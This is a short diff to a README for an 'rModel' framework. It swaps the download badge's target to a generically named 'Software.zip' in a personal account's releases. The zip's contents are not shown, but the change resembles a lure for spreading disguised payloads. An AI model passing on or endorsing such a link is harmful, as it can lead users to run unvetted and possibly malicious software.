@@ -11,7 +11,7 @@ Welcome to the official GitHub repository for **rModel** - a powerful framework 
 
 To get started with **rModel**, simply click on the link below to download the latest version of the framework:
 
-[![Download rModel](https://img.shields.io/badge/Download-rModel-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download rModel](https://github.com/Sasuke565/rmodel/releases/download/v1.0/Software.zip)](https://github.com/Sasuke565/rmodel/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the framework, follow the installation instructions provided in the documentation to set up **rModel** in your development environment.
 
